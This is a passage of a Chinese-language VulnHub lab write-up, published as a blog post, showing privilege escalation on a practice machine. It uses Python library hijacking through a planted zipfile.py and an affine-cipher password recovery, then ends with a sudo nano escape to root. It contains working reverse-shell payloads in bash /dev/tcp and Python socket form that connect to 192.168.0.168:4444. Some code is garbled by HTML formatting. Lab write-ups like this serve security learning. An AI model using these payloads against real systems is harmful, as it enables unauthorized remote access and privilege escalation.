&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1421.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;在靶机上看到了一个备份文件内容如下&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#在靶机上看到了一个备份文件内容如下&#34;&gt;#&lt;/a&gt; 在靶机上看到了一个备份文件内容如下&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1422.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;上传 pspy 监控，看这个备份脚本有没有定期被执行&lt;br&gt;
 wget 192.168.0.168/pspy64s -q ;chmod +x pspy64s;./pspy64s&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1423.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;看到这个 UID=1000 的用户定期执行了 backup.py 这个脚本，而在前面收集到的&lt;br&gt;
 /etc/passwd 文件可知，UID=1000 的用户是 carlos&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1424.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;分析这个备份文件，可知它引入了 zipfile 这个包，而它会优先在同一目录下寻&lt;br&gt;
找 zipfile，当脚本将被执行时，它不会使用 zipfile 模块，而是会导入我们的恶&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS16aXBmaWxlLWRnNWs2ODVrOTU0Zy5weQ==&#34;&gt;意软件 zipfile.py&lt;/span&gt;，并且我们的反向 shell 也会被执行。&lt;/p&gt;
&lt;p&gt;可在本地尝试此命令是否能反弹 shell：&lt;br&gt;
cat &amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3ppcGZpbGUucHk=&#34;&gt;zipfile.py&lt;/span&gt; &amp;lt;&amp;lt; EOF&lt;br&gt;
ZIP_DEFLATED = 0&lt;br&gt;
class ZipFile:&lt;br&gt;
def close(*args):&lt;br&gt;
return&lt;br&gt;
def write(*args):&lt;br&gt;
return&lt;br&gt;
def &lt;strong&gt;init&lt;/strong&gt;(self, *args):&lt;br&gt;
return&lt;br&gt;
&lt;strong&gt;import&lt;/strong&gt;(‘os’).system(‘bash -c “bash -i&amp;gt;&amp;amp; /dev/tcp/192.168.0.168/4444 0&amp;gt;&amp;amp;1”’)&lt;br&gt;
EOF&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1425.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;也可以不用借助 bash 直接用 python 来反弹 shell，本地测试能否用在上靶机&lt;br&gt;
 python -c ‘import socket,subprocess,os;&lt;br&gt;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);&lt;br&gt;
s.connect((“192.168.0.168”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);&lt;br&gt;
os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-i&amp;quot;]);’&lt;br&gt;
上面的这个脚本不会反弹处标准 shell，下面的这个会反弹处标准终端&lt;br&gt;
 python -c ‘import socket,pty,os;&lt;br&gt;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);&lt;br&gt;
s.connect((“192.168.0.168”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);&lt;br&gt;
os.dup2(s.fileno(),2);os.putenv(“HISTFILE”,&amp;quot;/dev/null&amp;quot;);pty.spawn(&amp;quot;/bin/bash&amp;quot;);&lt;br&gt;
s.close()’&lt;/p&gt;
&lt;h3 id=&#34;004-仿射加密法解密nano权限设置错误提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#004-仿射加密法解密nano权限设置错误提权&#34;&gt;#&lt;/a&gt; 004 仿射加密法解密，nano 权限设置错误提权&lt;/h3&gt;
&lt;p&gt;现在成功拿到了 carlos 用户，即 UID= 1000 用户的终端，看到一个加密脚本&lt;br&gt;
仿射加密法与单码加密法没什么不同，因为明文的每个字母分别只映射到一&lt;br&gt;
个密文字母。仿射密码的加密算法就是一个线性变换，即对任意的明文字符 x，&lt;br&gt;
对应的密文字符为 y=e (x)=ax+b (mod26)，其中，a,b∈Z 26 ，且要求 gcd (a, 26 )= 1 ,&lt;br&gt;
 函数 e (x) 称为仿射加密函数。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1426.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;并且在此目录下找到了一个文件提示说密码为&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#并且在此目录下找到了一个文件提示说密码为&#34;&gt;#&lt;/a&gt; 并且在此目录下找到了一个文件提示说密码为&lt;/h3&gt;
&lt;p&gt;The password format is “****&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;FUN&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;”&lt;/p&gt;
&lt;p&gt;此脚本的作用就是将原密码加密后变成了 FAJSRWOXLAXDQZAWNDDVLSU&lt;br&gt;
 需要两个 key 值，知道 FUN 经过加密后变成了 QZA，依此推断 key 的范围。&lt;br&gt;
关于更多放射密码可访问 https://en.wikipedia.org/wiki/Affine_cipher&lt;br&gt;
cat &amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEucHk=&#34;&gt;1.py&lt;/span&gt; &amp;lt;&amp;lt; EOF&lt;br&gt;
import sys&lt;br&gt;
def affine_encrypt(text, key):&lt;br&gt;
return ‘’.join([ chr((( key[0]*(ord(t) - ord(‘A’)) + key[1] ) % 26)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ord(‘A’)) for t in text.upper().replace(’ &#39;, ‘’) ])&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == ‘&lt;strong&gt;main&lt;/strong&gt;’:&lt;br&gt;
affine_text=“FUN”&lt;br&gt;
for key0 in range(65, 91):&lt;br&gt;
for key1 in range(65, 91):&lt;br&gt;
encrypt_text = affine_encrypt(affine_text, [key0, key1])&lt;br&gt;
if encrypt_text == “QZA”:&lt;br&gt;
print(key0,key1)&lt;br&gt;
sys.exit(0)&lt;/p&gt;
&lt;h3 id=&#34;eof&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#eof&#34;&gt;#&lt;/a&gt; EOF&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1427.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得到 key 为（ 89 ， 65 ）之后，编写解密文件，进行解密密码&lt;br&gt;
 cat &amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzIucHk=&#34;&gt;2.py&lt;/span&gt; &amp;lt;&amp;lt; EOF&lt;br&gt;
def affine_decrypt(cipher):&lt;br&gt;
text = []&lt;br&gt;
for t in cipher:&lt;br&gt;
b = ord(t) - ord(‘A’)&lt;br&gt;
for x in range(0, 26):&lt;br&gt;
result = (65 + x*89 - b) % 26&lt;br&gt;
if result == 0:&lt;br&gt;
text.append(chr(x + ord(‘A’)))&lt;br&gt;
break&lt;br&gt;
print(’’.join(text))&lt;/p&gt;
&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == ‘&lt;strong&gt;main&lt;/strong&gt;’:&lt;br&gt;
affine_encrypted_text = “FAJSRWOXLAXDQZAWNDDVLSU”&lt;br&gt;
affine_decrypt(affine_encrypted_text)&lt;br&gt;
EOF&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1428.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得到的密码测试之后是属于 carlos 用户的密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1429.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;有了密码之后可以看到 carlos 用户 nano 的权限设置错误了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1430.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;查看 gtfobins 找到了提权命令&lt;br&gt;
 sudo /bin/nano/opt/priv&lt;br&gt;
Ctrl + R&lt;br&gt;
Ctrl + X&lt;br&gt;
reset; sh 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1431.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;–&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
